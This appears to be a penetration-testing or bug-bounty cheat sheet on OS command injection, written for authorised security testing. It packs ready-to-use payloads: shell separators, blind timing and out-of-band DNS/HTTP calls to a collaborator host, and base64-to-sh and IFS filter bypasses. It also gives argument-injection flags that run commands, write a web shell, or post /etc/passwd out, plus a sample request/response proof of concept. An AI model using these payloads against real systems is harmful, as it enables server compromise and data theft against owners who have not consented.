# OS Command Injection

**What it is:** Input reaches a shell/exec call → run OS commands on the server.

## Where to look
Anything that shells out: ping/traceroute/nslookup tools, PDF/image converters (ImageMagick, ffmpeg, LibreOffice), file processors, archive/unzip, git/svn ops, backup/export, DNS/whois lookups.

## Detection
- [ ] Separators: `; id`, `| id`, `|| id`, `&& id`, `& id`, `%0a id`, backticks `` `id` ``, `$(id)`.
- [ ] Blind → time: `; sleep 5`, `& ping -c 5 127.0.0.1`.
- [ ] Blind → OOB: `; nslookup $(whoami).<collab>` / `curl http://<collab>/`.
- [ ] Argument injection: `-o`, `--output`, `@file` when you can't inject a full command.

## Filter bypass
- Quotes/vars: `w'h'oami`, `wh$@oami`, `${IFS}` for spaces, `$IFS$9`.
- Encoding: base64 `echo ... | base64 -d | sh`, hex, `\` line continuation.

## Impact
RCE, full server compromise, pivot.

## Tools
`commix`, Collaborator/interactsh for blind, manual.

## 🎯 PoC — Request → Response

**Injection in a DNS-lookup tool that shells out:**
```http
POST /api/v1/tools/dns-lookup HTTP/2
Host: target.com
Authorization: Bearer <mine>
Content-Type: application/json

{"hostname":"example.com; id"}
```
```http
HTTP/2 200 OK
Content-Type: application/json

{"result":"example.com has address 93.184.216.34\nuid=1000(app) gid=1000(app) groups=1000(app)"}
```
`id` output appended = RCE.

**Blind → OOB confirmation:**
```http
{"hostname":"example.com| nslookup $(whoami).COLLAB"}
```
```http
HTTP/2 200 OK
{"result":"..."}          # body may be empty; check Collaborator:
# DNS interaction: app.COLLAB  (payload executed, `whoami`=app)
```

## Deep cuts — argument injection & no-metachar RCE
- [ ] **Argument injection (no shell metachars needed):** when input is passed as an *arg* to a binary, inject flags:
```
tar:        --checkpoint=1 --checkpoint-action=exec=sh\ -c\ id     / -I '/bogus command'
git:        clone ext::sh -c id  / -u 'ext::...'  / --upload-pack  / -c core.sshCommand=
curl:       -o /var/www/shell.php  file:///etc/passwd  --config /path  -K @file
wget:       --use-askpass=/tmp/x  --output-document=/path  --post-file=/etc/passwd
ffmpeg:     -i concat:... / a .m3u pointing at file://  (SSRF + file read)
ImageMagick: MSL/MVG polyglot, `-write` , `msl:/tmp/x.msl`  (also `06-file-upload/03`)
zip/7z:     -TT/-so command exec ; symlink traversal in archives
find/xargs: -exec , -fprintf to write files
```
- [ ] **No-space bypass:** `${IFS}`, `$IFS$9`, `{cat,/etc/passwd}` brace-expansion, `<` redirection, tab `%09`.
- [ ] **No-slash / globbing:** `/???/??t /???/p??s??` , `/bin/c?t`, `cat$IFS$9/etc/passwd`.
- [ ] **Char-dodging:** `w`\`h`\`oami`, `wh$@oami`, `$(rev<<<'imaohw')`, `a=who;b=ami;$a$b`, base64/hex `echo Y2F0... |base64 -d|sh`.
- [ ] **Env/`PATH` hijack:** set `LD_PRELOAD`, `PERL5LIB`, `PYTHONPATH`, `IFS`, `PATH` if the app passes env; `PROMPT_COMMAND`/`BASH_ENV`.
- [ ] **Windows targets:** `& | && ||`, `%COMSPEC%`, `cmd /c`, PowerShell `;`+`iex`, `^` escaping, `for /f`, UNC `\\collab\x` for OOB.
- [ ] **Blind matrix:** time (`sleep`/`ping -c`), OOB DNS (`nslookup $(whoami).collab`), file-write-then-read, error-diff. Prefer DNS OOB — works through firewalls that block outbound HTTP.
- [ ] **Second-order:** stored value (filename, hostname, profile) later handed to a shell by a cron/worker — plant then trigger.

## Report notes
Prove with `id`/`hostname` output or an OOB DNS hit. No reverse shells, no persistence, no data theft on live targets. If argument-injection (no metachars), name the binary + flag abused.
